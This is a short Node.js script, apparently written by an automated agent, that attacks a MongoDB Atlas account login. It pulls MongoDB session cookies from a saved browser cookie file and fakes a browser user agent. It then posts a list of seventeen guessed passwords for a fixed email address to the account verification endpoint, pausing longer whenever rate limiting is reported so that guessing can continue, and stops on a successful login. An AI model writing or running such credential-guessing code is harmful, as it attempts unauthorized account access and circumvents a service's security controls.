
const fs = require('fs');

function writeResult(obj){ fs.writeFileSync('workflow_result.json', JSON.stringify(obj, null, 2)); }

function buildAccountCookieHeader() {
  try {
    const raw = JSON.parse(fs.readFileSync('browser_cookies.json','utf8'));
    const cookies = Array.isArray(raw.cookies) ? raw.cookies : [];
    const parts = [];
    for (const c of cookies) {
      const d = String(c.domain || '');
      const v = typeof c.value === 'string' ? c.value : '';
      if (!v) continue;
      if (d === 'account.mongodb.com' || d === '.account.mongodb.com' || d === '.mongodb.com') {
        parts.push(`${c.name}=${c.value}`);
      }
    }
    return parts.join('; ');
  } catch { return ''; }
}

async function tryPassword(password, cookieHeader) {
  const headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0',
  };
  if (cookieHeader) headers['Cookie'] = cookieHeader;
  const resp = await fetch('https://account.mongodb.com/account/auth/verify', {
    method: 'POST',
    headers,
    body: JSON.stringify({ username: 'oaimcpatlas@gmail.com', password }),
    redirect: 'manual',
  });
  const text = await resp.text();
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return {
    password,
    status: resp.status,
    at: new Date().toISOString(),
    headers: Object.fromEntries(resp.headers.entries()),
    body: text.slice(0, 1000),
    json
  };
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  const result = { triedAt: new Date().toISOString() };
  try {
    const cookieHeader = buildAccountCookieHeader();
    result.accountCookieHeaderLength = cookieHeader.length;
    const candidates = [
      'AtlasGHReset!8901',
      'AtlasGHReset!7890',
      'AtlasGHReset!6789',
      'AtlasGHReset!9012',
      'Scratch!321Aa',
      'AtlasTemp!2026#A',
      'AtlasTemp!2026#B',
      'Tmp!2e7ad4aa5c4fe3d1aA1',
      'V7u!9xK#2mQ@4nR$8tP^6sL&',
      'VJ2!V6Q!Tm)k(K)Ls9An*t8uN9',
      'AtlasKnown!12345',
      'GHQuery!83fddfa4Z9#',
      'VM5!YXAtnZLkAkl@U9MGVb0q0w',
      'VQ3!V%6f6=DUBT@E6VTkjvR5iy',
      'Vu7#qL9!sT2@wX4$zN8^mP6&',
      'AgentFull!9010x',
      'VL1!KD_%wowyaI*XKxwYTLMXxW',
    ];
    result.candidates = [];
    for (const pw of candidates) {
      const res = await tryPassword(pw, cookieHeader);
      result.candidates.push(res);
      writeResult(result);
      if (res.status === 200 && res.json && res.json.status === 'OK') {
        result.success = res;
        break;
      }
      const err = res.json && res.json.errorCode;
      if (err === 'RATE_LIMITED') {
        await sleep(45000);
      } else {
        await sleep(5000);
      }
    }
  } catch (e) {
    result.error = String(e && e.stack || e);
  } finally {
    writeResult(result);
  }
}
main();
